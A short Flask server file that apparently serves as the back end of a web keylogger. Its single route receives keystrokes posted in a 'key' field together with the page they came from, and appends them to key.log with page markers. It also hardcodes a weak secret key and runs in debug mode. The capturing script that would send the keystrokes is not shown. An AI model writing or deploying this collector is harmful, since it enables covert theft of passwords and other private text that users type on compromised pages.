from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'supersekritpassword'

@app.route('/', methods=['POST'])
def save_key():
    if request.method != 'POST' or 'key' not in request.form:
        return "Access Denied", 403
    
    # Open log for keys to record
    with open("key.log", "a+") as file:
        # Keep track of the page and when it changes
        if 'page' in request.form and ('page' not in session or session['page'] != request.form['page']):
            session['page'] = request.form['page']
            file.write("\n[[[ PAGE: {} ]]]".format(request.form['page']))

        # Append to log
        file.write(request.form['key'])

    return 'OK', 200

if __name__ == '__main__':
    app.run(debug=True)